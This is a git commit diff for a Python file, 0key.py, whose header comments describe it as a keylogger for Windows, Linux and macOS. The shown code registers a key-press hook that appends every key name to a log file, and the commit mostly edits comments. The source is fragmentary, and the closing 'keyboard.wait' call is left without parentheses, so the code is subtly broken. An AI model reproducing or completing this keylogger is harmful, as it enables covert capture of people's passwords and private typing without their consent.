fd5e8772c4be6c77c305e343387fbd16957710de
d0rk-devel <d0rk.devel@gmail.com>
2024-03-09 22:58:55 +0100

    init commit
    .

--- 0key.py
+++ 0key.py
@@ -1,8 +1,9 @@
+# -
 # python3.12.2
 # 0key keylogger 
 # windows - linux - Macos
 # github - gitlab
-# -
+# -- 
 # - 
 
 import keyboard
@@ -12,11 +13,12 @@ def on_key_press(event):
     with open(log_file, "a") as f:
         f.write(event.name)
 
-# key -on _
+# key -on _press
+#
 keyboard.on_press(on_key_press)
 # .wait 
 # v0.0.1
 
 keyboard.wait
-
+# .
 
